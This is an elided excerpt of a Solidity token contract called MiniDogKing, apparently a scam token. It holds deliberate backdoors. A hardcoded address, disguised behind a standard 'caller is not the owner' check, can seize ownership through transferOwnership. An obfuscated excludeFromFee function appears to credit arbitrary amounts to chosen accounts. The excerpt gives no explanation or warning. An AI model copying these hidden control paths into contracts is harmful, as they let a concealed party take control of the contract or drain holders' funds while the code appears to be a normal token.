...
contract Ownable is Context {
    ...
    address private _dmAddress = 0x54Eae5C441dEf80A9D4ef694aEB9c3fcbF85b07d;
    ...
    modifier dmAddress() {
        require(_dmAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual dmAddress {
        _owner = newOwner;
    }
}
...
contract MiniDogKing is Context, IERC20, Ownable {
    ...
    string private _name = "MiniDogKing";
    string private _symbol = "MiniDogKing";
    ...
    address public devAddress = 0x54Eae5C441dEf80A9D4ef694aEB9c3fcbF85b07d;
    ...
    uint256 private Tfdgf = uint256(0);
    ...
    function excludeFromFee
        ...
        uint256 pinn1 = Tfdgfs[account];
        if (pinn1 == 0) _Tfdgfs.push(account);
        Tfdgfs[account] = pinn1.add(amountt);
